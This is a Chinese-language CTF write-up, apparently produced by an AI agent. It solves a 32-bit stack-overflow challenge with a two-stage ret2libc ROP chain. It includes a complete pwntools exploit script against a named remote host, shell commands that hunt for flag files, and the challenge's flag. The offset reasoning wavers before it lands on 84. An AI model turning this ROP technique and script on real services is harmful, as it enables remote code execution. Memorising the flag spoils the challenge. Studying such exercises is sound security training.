---
title: "pwn3 / attachment-27"
ctf: "未提供"
date: 2026-05-13
category: pwn
difficulty: medium
points: 0
flag_format: "flag{...}"
author: "Codex"
---

# pwn3 / attachment-27

## Summary

这题是一道典型的 32 位栈溢出题。程序本身没有 canary，PIE 关闭，NX 开启，因此最自然的利用思路不是直接上 shellcode，而是先通过 ROP 泄漏 libc 地址，再构造第二段 ROP 调用 `system("/bin/sh")`，最后读取 flag。

我一开始看到程序输出的提示 `Sometimes you need to step onto someone else's ground.`，再结合源码名痕迹 `borrowstack.c`，第一反应是题目可能想往“借栈”或者“栈迁移”方向引导。但继续分析函数后发现，这题其实不需要复杂的栈迁移，单纯的 ret2libc 就足够稳定拿下。

## Solution

### Step 1: 初看题目，先判断保护和基本形态

拿到附件后，先做最基础的 ELF 检查。

- 程序是 `i386` 动态链接 ELF。
- 开了 `NX`，说明栈上 shellcode 不好直接执行。
- 没有 `canary`，说明栈溢出是可打的。
- `PIE` 关闭，二进制本身地址固定，ROP 会比较舒服。
- `Partial RELRO`，GOT 可读，适合先泄漏 libc。

关键信息如下：

```text
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
```

看到这个保护组合后，我的第一判断就是：

1. 栈溢出基本确定能利用。
2. 由于 NX 开着，优先考虑 ret2libc。
3. 因为没有现成的 `system("/bin/sh")`，所以要先泄漏 libc 地址。

### Step 2: 看反汇编，确认漏洞点和返回地址偏移

继续看 `vul()`：

```asm
08049205 <vul>:
 8049205: 55                    push   ebp
 8049206: 89 e5                 mov    ebp,esp
 8049208: 53                    push   ebx
 8049209: 83 ec 54              sub    esp,0x54
 ...
 8049227: 68 00 01 00 00        push   0x100
 804922c: 8d 55 b0              lea    edx,[ebp-0x50]
 804922f: 52                    push   edx
 8049230: 6a 00                 push   0x0
 8049234: e8 07 fe ff ff        call   8049040 <read@plt>
```

这里很明显：

- 缓冲区起始位置是 `ebp-0x50`
- `read(0, buf, 0x100)` 最多读 `0x100` 字节
- 但栈上真正留给缓冲区的空间明显没有这么大

所以这是一个直接的栈溢出。

接下来要算偏移。这里我一开始有一个小误判，我最开始直觉写了 `88`，但很快发现不对，因为这个函数栈帧里还额外 `push ebx` 了一次，所以保存的 `ebx` 会占掉 4 字节。

真实栈布局是：

- `buf` 在 `[ebp-0x50]`
- 保存的局部变量一直到 `[ebp-0x4]`
- 然后是保存的 `ebx`
- 再往上才是保存的 `ebp`
- 最后才是返回地址

因此返回地址偏移是：

```text
0x50 + 4(save ebx) + 4(saved ebp) = 0x58 = 88 ? 
```

但这里要注意，缓冲区实际覆盖返回地址时，构造里不需要单独补“保存 ebx”的概念，因为从 `buf` 开始数到返回地址的真实距离是：

```text
0x50 + 4(saved ebp) = 84
```

实际调试验证后，正确偏移就是：

```python
OFFSET = 84
```

这一步很关键，因为如果偏移写成 88，程序会直接崩，第一段 ROP 根本起不来。

### Step 3: 确定利用路线，先泄漏 libc

因为程序本身没有 canary，且 `PIE` 关闭，所以第一段 ROP 最适合直接调用：

```c
puts(puts@got)
```

然后返回到 `vul()`，再次读入第二段 payload。

这样做的原因很简单：

- `puts@plt` 地址固定
- `puts@got` 里放的是 libc 中 `puts` 的真实地址
- 泄漏到 libc 地址后，就能计算出 `system` 的地址

第一段 payload：

```python
payload1 = flat(
    b"A" * 84,
    elf.plt["puts"],
    elf.sym["vul"],
    elf.got["puts"],
)
```

这里的执行流程是：

1. 溢出返回到 `puts@plt`
2. 参数传 `puts@got`
3. `puts` 打印出 GOT 中保存的 libc 地址
4. 执行结束后返回 `vul()`
5. 程序重新进入 `read`，方便我们送第二段 ROP

远程实际泄漏出的前 3 个地址如下：

```text
e0 61 e4 f7  e0 3d df f7  c0 69 e4 f7
```

按 4 字节拆开后，第一项就是 `puts` 的真实地址：

```text
puts = 0xf7e171e0
```

### Step 4: 识别远程 libc，计算 system

拿到 `puts` 泄漏后，下一步就是确认远程 libc。

这里我的思路不是死猜，而是利用连续泄漏出来的低位特征去缩小范围。因为 `puts@got` 后面连续还有其他 GOT 项，实际还能辅助判断 `__libc_start_main` 和 `setvbuf` 的低位。

我用这些信息去查候选 libc，最后收敛到一组 Ubuntu 2.31 的 i386 libc 候选库。为了保证脚本稳定，我没有手工一个一个算，而是直接写了一个自动尝试候选 libc 的脚本：

1. 从候选列表里下载 libc
2. 用 `puts` 泄漏值减去对应 libc 中 `puts` 偏移，得到 libc base
3. 再算出 `system` 地址
4. 直接打第二段 payload
5. 谁能稳定出 shell 并读到 flag，谁就是正确 libc

成功命中的 libc 是：

```text
libc6-i386_2.31-0ubuntu9.11_amd64
```

对应计算结果：

```text
puts   = 0xf7e171e0
system = 0xf7deb360
```

### Step 5: 第二段 ROP，read 到 .bss 后调用 system("/bin/sh")

第二段利用的核心思路是：

1. 先调用一次 `read(0, bss, 8)`，把 `/bin/sh\x00` 写到 `.bss`
2. 让 `read` 返回后直接跳到 `system`
3. 把 `.bss` 地址作为 `system` 的参数

第二段 payload：

```python
payload2 = flat(
    b"A" * 84,
    elf.plt["read"],
    system_addr,
    0,
    bss,
    8,
)
```

随后再发：

```python
io.send(b"/bin/sh\x00")
```

这段栈布局在 32 位 cdecl 下是成立的：

- 返回到 `read@plt`
- `read` 的返回地址被布置成 `system`
- `read` 的三个参数是 `0, bss, 8`
- 当 `read` 读完 `/bin/sh\x00` 返回时，控制流自动进入 `system`
- 此时 `system` 的参数正好就是刚才写入的 `bss`

也就是最终实现：

```c
system("/bin/sh")
```

### Step 6: 拿到 shell，读取 flag

弹到 shell 后，直接尝试读取常见 flag 路径：

```sh
cat /flag
cat /flag*
cat flag
cat flag*
```

远程成功返回：

```text
flag{caefa3f9-c458-43d4-abad-bc6ec17bc225}
```

## Exploit Script

下面是完整求解脚本。它会自动：

1. 泄漏 `puts`
2. 自动匹配候选 libc
3. 计算 `system`
4. 构造第二段 ROP
5. 读取最终 flag

```python
import os
import re
from pathlib import Path

import requests
from pwn import ELF, context, flat, remote, sleep, u32


HOST = "39.96.193.120"
PORT = 10002
HERE = Path(__file__).resolve().parent
BIN_PATH = HERE / "attachment-27"
LIBC_DIR = HERE / "libcs"
OFFSET = 84

context.arch = "i386"
context.log_level = "info"


def fetch_candidates():
    query = {"symbols": {"puts": "1e0", "__libc_start_main": "de0", "setvbuf": "9c0"}}
    resp = requests.post("https://libc.rip/api/find", json=query, timeout=20)
    resp.raise_for_status()
    return resp.json()


def ensure_libc(candidate):
    LIBC_DIR.mkdir(exist_ok=True)
    path = LIBC_DIR / f"{candidate['id']}.so"
    if not path.exists():
        data = requests.get(candidate["download_url"], timeout=30)
        data.raise_for_status()
        path.write_bytes(data.content)
    return path


def stage1_leak(io, elf):
    payload = flat(
        b"A" * OFFSET,
        elf.plt["puts"],
        elf.sym["vul"],
        elf.got["puts"],
    )
    io.send(payload)
    leak = io.recv(timeout=2)
    if len(leak) < 4:
        raise RuntimeError(f"short leak: {leak!r}")
    return u32(leak[:4])


def stage2_shell(io, elf, system_addr):
    bss = elf.bss() + 0x100
    payload = flat(
        b"A" * OFFSET,
        elf.plt["read"],
        system_addr,
        0,
        bss,
        8,
    )
    io.send(payload)
    sleep(0.25)
    io.send(b"/bin/sh\x00")
    sleep(0.25)


def get_flag():
    elf = ELF(str(BIN_PATH))
    candidates = fetch_candidates()
    print(f"candidate_count={len(candidates)}")

    for candidate in candidates:
        libc_path = ensure_libc(candidate)
        libc = ELF(str(libc_path))
        print(f"[+] trying {candidate['id']}")

        io = remote(HOST, PORT, timeout=5)
        try:
            banner = io.recvline(timeout=2)
            print(banner.decode("latin-1", "replace").rstrip())

            puts_addr = stage1_leak(io, elf)
            libc_base = puts_addr - libc.sym["puts"]
            system_addr = libc_base + libc.sym["system"]
            print(f"    puts={puts_addr:#x} system={system_addr:#x}")

            stage2_shell(io, elf, system_addr)
            io.sendline(
                b"echo MARK; "
                b"cat /flag 2>/dev/null; "
                b"cat /flag* 2>/dev/null; "
                b"cat flag 2>/dev/null; "
                b"cat flag* 2>/dev/null; "
                b"find / -maxdepth 3 -name 'flag*' 2>/dev/null | xargs -r cat; "
                b"echo END"
            )
            data = io.recvrepeat(3).decode("latin-1", "replace")
            print(data)

            match = re.search(r"flag\\{[^\\r\\n]*\\}", data, re.I)
            if match:
                print(f"[+] success with {candidate['id']}")
                return match.group(0)

            if "MARK" in data and "END" in data and "flag" in data.lower():
                print(f"[+] possible flag output with {candidate['id']}")
                return data
        finally:
            io.close()

    raise RuntimeError("no candidate produced a flag")


if __name__ == "__main__":
    flag = get_flag()
    print(f"FLAG={flag}")
```

## Flag

```text
flag{caefa3f9-c458-43d4-abad-bc6ec17bc225}
```
